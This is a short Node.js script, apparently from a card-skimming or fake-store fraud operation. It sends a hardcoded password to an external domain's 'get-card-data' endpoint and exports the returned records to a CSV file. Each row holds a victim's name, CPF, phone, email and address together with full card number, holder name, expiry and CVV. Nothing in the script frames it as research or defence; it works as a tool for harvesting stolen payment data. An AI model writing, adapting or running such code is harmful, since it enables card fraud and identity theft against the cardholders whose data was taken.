const fs = require('fs');
const path = require('path');

async function exportCardData() {
  try {
    console.log('🔄 Buscando dados do servidor...');
    
    const response = await fetch("https://distribuidoraconfigas.store/api/get-card-data", {
      method: "POST",
      headers: {
        "accept": "*/*",
        "content-type": "application/json",
      },
      body: JSON.stringify({ password: "vipcolheita2025" })
    });

    if (!response.ok) {
      throw new Error(`Erro HTTP: ${response.status}`);
    }

    const result = await response.json();
    
    if (!result.success) {
      throw new Error(result.error || 'Erro ao buscar dados');
    }

    const data = result.data;
    console.log(`✅ ${data.length} registros encontrados`);

    if (data.length === 0) {
      console.log('⚠️  Nenhum dado para exportar');
      return;
    }

    // Criar CSV
    const headers = [
      'ID',
      'Data/Hora',
      'Nome Cliente',
      'CPF',
      'Telefone',
      'Email',
      'Endereço',
      'Número do Cartão',
      'Nome no Cartão',
      'Validade',
      'CVV',
      'Produto',
      'Preço',
      'Quantidade',
      'Total'
    ];

    const csvRows = [];
    csvRows.push(headers.join(','));

    data.forEach(item => {
      const row = [
        item.id || '',
        `"${item.timestamp || ''}"`,
        `"${item.customer?.name || ''}"`,
        `"${item.customer?.cpf || ''}"`,
        `"${item.customer?.phone || ''}"`,
        `"${item.customer?.email || ''}"`,
        `"${item.customer?.address || ''}"`,
        `"${item.card?.number || ''}"`,
        `"${item.card?.holderName || ''}"`,
        `"${item.card?.expiryDate || ''}"`,
        `"${item.card?.cvv || ''}"`,
        `"${item.product?.name || ''}"`,
        (item.product?.price || 0) / 100, // Converter centavos para reais
        item.product?.quantity || '',
        (item.total || 0) / 100 // Converter centavos para reais
      ];
      csvRows.push(row.join(','));
    });

    const csvContent = csvRows.join('\n');

    // Salvar arquivo
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, -5);
    const filename = `card-data-export-${timestamp}.csv`;
    const filepath = path.join(__dirname, filename);

    fs.writeFileSync(filepath, '\ufeff' + csvContent, 'utf8'); // BOM para UTF-8

    console.log(`\n✅ Dados exportados com sucesso!`);
    console.log(`📁 Arquivo: ${filename}`);
    console.log(`📍 Local: ${filepath}`);
    console.log(`📊 Total de registros: ${data.length}`);

  } catch (error) {
    console.error('❌ Erro ao exportar dados:', error.message);
    process.exit(1);
  }
}

// Executar
exportCardData();
